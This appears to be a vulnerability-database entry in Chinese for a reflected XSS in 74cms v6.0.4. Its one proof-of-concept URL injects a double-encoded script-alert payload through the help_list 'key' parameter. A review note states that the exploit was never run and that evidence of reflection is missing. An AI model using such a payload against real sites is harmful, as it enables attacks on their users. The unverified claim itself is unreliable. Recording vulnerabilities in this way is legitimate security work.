---
source: "hatch 补库批 20260928"
product: "74cms"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "74cms v6.0.4 反射型xss"
prerequisites: "来源所述条件，未列明部分仍待核：6.0.4 stated; help/help_list key parameter; double encoding and hash unexplained"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-01cb4913885f73ef976606ef"
entity_id: "ve-01cb4913885f73ef976606ef"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：6.0.4 stated; help/help_list key parameter; double encoding and hash unexplained

- **证据待核（1）**：No reflection context, response, browser execution proof, source, or auth discussion。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（2）**：Overview empty; long fixed hash may be environment-dependent。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 74cms v6.0.4 反射型xss

一、漏洞简介
------------

二、漏洞影响
------------

74cms v6.0.4

三、复现过程
------------

    http://www.0-sec.org/index.php?m=&c=help&a=help_list&key=137244gq1lw%253cscript%253ealert%25281%2529%253c%252fscript%253edutvxlqd4lq&__hash__=d7aa5a382f14d270c3ac4de8392b4e1d_a34adb2b339972672eb447276f69ee88
